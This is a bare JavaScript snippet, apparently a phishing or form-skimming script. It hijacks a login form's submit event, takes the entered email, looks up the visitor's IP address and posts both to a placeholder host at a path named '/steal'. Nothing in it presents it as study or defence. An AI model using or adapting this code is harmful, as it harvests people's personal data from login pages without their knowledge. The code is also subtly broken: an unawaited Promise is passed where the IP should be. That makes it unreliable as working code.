const form = document.getElementById('login-form');
const submitBtn = document.getElementById('submit-btn');

form.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const ip = getIp();
    sendEmail(email, ip);
});

function getIp() {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                resolve(xhr.responseText);
            } else {
                reject(xhr.statusText);
            }
        };
        xhr.send();
    });
}

function sendEmail(email, ip) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://your-server.com/steal', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        email: email,
        ip: ip
    }));
}
